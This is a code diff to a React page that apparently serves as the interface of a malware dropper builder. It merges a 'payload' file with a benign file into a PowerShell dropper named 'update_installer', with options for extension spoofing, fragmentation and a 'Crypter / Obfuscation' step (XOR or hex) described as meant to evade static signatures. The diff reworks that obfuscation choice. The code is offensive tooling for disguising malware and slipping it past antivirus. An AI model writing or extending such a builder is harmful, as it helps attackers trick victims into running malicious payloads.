@@ -26,7 +26,7 @@ const formSchema = z.object({
   outputName: z.string().min(1, "Output name is required."),
   outputFormat: z.string(),
   extensionSpoofing: z.boolean().default(false),
-  useXorEncryption: z.boolean().default(false),
+  obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
   xorKey: z.string().optional(),
   useFragmentation: z.boolean().default(false),
 });
@@ -55,11 +55,13 @@ export default function MergingStationPage() {
       outputName: 'update_installer',
       outputFormat: 'ps1',
       extensionSpoofing: false,
-      useXorEncryption: false,
+      obfuscationType: 'none',
       xorKey: 'netrax',
       useFragmentation: false,
     },
   });
+
+  const watchObfuscationType = form.watch('obfuscationType');
 
  const applyExtensionSpoofing = (filename: string): string => {
     const parts = filename.split('.');
@@ -107,7 +109,8 @@ export default function MergingStationPage() {
             payload: { name: payloadFile.name, content: payloadContent },
             benign: { name: benignFile.name, content: benignContent },
             outputFormat: values.outputFormat as any,
-            encryption: values.useXorEncryption ? { type: 'xor', key: values.xorKey || 'defaultkey' } : undefined,
+            obfuscationType: values.obfuscationType,
+            encryptionKey: values.obfuscationType === 'xor' ? values.xorKey : undefined,
             useFragmentation: values.useFragmentation,
         });
         
@@ -116,8 +119,8 @@ export default function MergingStationPage() {
         }
         
         log(`Dropper script generated successfully (${values.outputFormat}).`);
-        if (values.useXorEncryption) {
-            log(`Payload encrypted with XOR key: '${values.xorKey}'`);
+        if (values.obfuscationType !== 'none') {
+            log(`Payload obfuscated with ${values.obfuscationType.toUpperCase()}`);
         }
         if (values.useFragmentation) {
             log(`Payload split into fragments.`);
@@ -216,20 +219,28 @@ export default function MergingStationPage() {
                  <Card>
                     <CardHeader><CardTitle className="text-lg">3. Crypter / Obfuscation</CardTitle></CardHeader>
                     <CardContent className="space-y-4">
-                        <FormField
+                         <FormField
                             control={form.control}
-                            name="useXorEncryption"
+                            name="obfuscationType"
                             render={({ field }) => (
-                            <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4">
-                                <FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl>
-                                <div className="space-y-1 leading-none">
-                                <FormLabel>Enable XOR Encryption</FormLabel>
-                                <FormDescription>Encrypt the payload with a simple XOR cipher to evade static signatures.</FormDescription>
-                                </div>
+                            <FormItem className="space-y-3">
+                                <FormLabel>Encoding / Encryption</FormLabel>
+                                <FormControl>
+                                <RadioGroup
+                                    onValueChange={field.onChange}
+                                    defaultValue={field.value}
+                                    className="flex flex-col space-y-1"
+                                >
+                                    <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="none" /></FormControl><FormLabel className="font-normal">None</FormLabel></FormItem>
+                                    <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="xor" /></FormControl><FormLabel className="font-normal">XOR Encryption</FormLabel></FormItem>
+                                    <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="hex" /></FormControl><FormLabel className="font-normal">Hex Encoding</FormLabel></FormItem>
+                                </RadioGroup>
+                                </FormControl>
+                                <FormMessage />
                             </FormItem>
                             )}
                         />
-                         {form.watch('useXorEncryption') && (
+                         {watchObfuscationType === 'xor' && (
                             <FormField
                                 control={form.control}
                                 name="xorKey"
